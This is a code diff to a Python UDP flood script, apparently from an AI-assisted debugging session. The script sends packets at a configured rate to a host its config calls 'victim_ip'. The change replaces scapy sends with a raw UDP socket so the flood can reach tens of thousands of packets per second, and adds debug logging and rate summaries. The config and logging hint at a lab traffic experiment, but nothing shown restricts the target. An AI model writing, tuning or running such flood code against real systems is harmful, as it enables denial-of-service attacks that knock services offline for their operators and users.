@@ -250,8 +250,35 @@ def main():
     atk = cfg["attack"]
     dst_ip = cfg["network"]["victim_ip"]
     payload = build_payload(cfg)
-    pkt = IP(dst=dst_ip) / UDP(dport=atk["target_port"], sport=atk["source_port"]) / Raw(load=payload)
     pkt_total_bytes = len(payload) + 28  # IPv4 (20) + UDP (8)
+
+    # High-rate flood path: plain UDP socket (no scapy in the hot loop).
+    # scapy.send() re-serializes + opens a raw socket per call, capping at
+    # ~50 pps regardless of target rate. sendto() on a bound UDP socket
+    # easily clears 50k pps.
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    try:
+        sock.bind(("0.0.0.0", atk["source_port"]))
+    except OSError:
+        # Fall back to ephemeral source port if the configured one is busy.
+        sock.bind(("0.0.0.0", 0))
+    dst_addr = (dst_ip, atk["target_port"])
+    # #region agent log
+    _dbg(
+        "src/udp_flood.py:socket_ready",
+        "udp socket bound",
+        data={
+            "dst": f"{dst_ip}:{atk['target_port']}",
+            "src_port_configured": atk["source_port"],
+            "src_port_actual": sock.getsockname()[1],
+            "payload_bytes": len(payload),
+            "target_pps": atk.get("target_pps"),
+            "mode": atk.get("mode"),
+        },
+        hypothesisId="H3_rate_capped",
+        runId="post-fix",
+    )
+    # #endregion
 
     sample_interval_s = cfg["logging"]["sample_interval_ms"] / 1000.0
     logger = RateLogger(run_dir, sample_interval_s)
@@ -295,7 +322,7 @@ def main():
             if now < next_send_mono:
                 time.sleep(next_send_mono - now)
 
-            send(pkt, verbose=False)
+            sock.sendto(payload, dst_addr)
             sent += 1
             bytes_sent += pkt_total_bytes
             next_send_mono += interval
@@ -312,9 +339,15 @@ def main():
         elapsed = t_stop_mono - t_start_mono
         logger.maybe_sample(elapsed, sent, bytes_sent, force=True)
         logger.close()
+        try:
+            sock.close()
+        except Exception:
+            pass
         mean_pps = sent / elapsed if elapsed > 0 else 0.0
+        target_pps = atk.get("target_pps")
         write_summary(run_dir, run_id, {
             "mode": atk["mode"],
+            "target_pps": target_pps,
             "duration_s": elapsed,
             "sent": sent,
             "bytes_sent": bytes_sent,
@@ -333,11 +366,12 @@ def main():
                 "bytes_sent": bytes_sent,
                 "elapsed_s": elapsed,
                 "mean_pps": mean_pps,
-                "target_pps": atk.get("pps"),
+                "target_pps": target_pps,
                 "mode": atk.get("mode"),
                 "exit_reason": exit_reason["value"],
             },
             hypothesisId="H3_rate_capped",
+            runId="post-fix",
         )
         # #endregion
         print(
